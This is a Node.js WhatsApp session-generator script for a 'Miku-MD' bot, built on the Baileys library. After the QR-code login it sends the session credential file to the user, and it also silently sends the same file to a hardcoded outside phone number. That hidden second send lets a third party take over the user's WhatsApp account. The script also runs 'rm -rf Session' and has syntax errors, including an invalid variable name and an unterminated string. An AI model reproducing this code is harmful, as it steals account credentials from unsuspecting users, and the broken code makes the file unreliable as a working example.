const makeWASocket = require("@adiwajshing/baileys").default
const qrcode = require("qrcode-terminal")
const fs = require('fs')
const pino = require('pino')
const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
const { state, saveState } = useSingleFileAuthState('./Session/Session.Miku-MD.json')
const qrc = JSON.parse(fs.readFileSync('./qr.json'))
fle-nme = qrc.session-name
const { exec, spawn, execSync } = require("child_process")
exec('rm -rf Session)


  function OLDUSER() {
//------------------------------------------------------
    let version = [3,3234,9]
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true,
        browser: ['MIKU-MD','opera','1.0.0'],
        auth: state,
        version
    })
//------------------------------------------------------
    conn.ev.on("connection.update",async  (s) => {
        const { connection, lastDisconnect } = s
        if (connection == "open") {
            await delay(1000 * 10);
  const session = fs.readFileSync("./Session/Session.Miku-MD.json");
   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `${fle-nme}` })
	 await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${fle-nme}` })
            process.exit(0)
        }
        if (
            connection === "close" &&
            lastDisconnect &&
            lastDisconnect.error &&
            lastDisconnect.error.output.statusCode != 401
        ) {
            OLDUSER()
        }
    })
    conn.ev.on('creds.update', saveState)
    conn.ev.on("messages.upsert",  () => { })
}
OLDUSER()
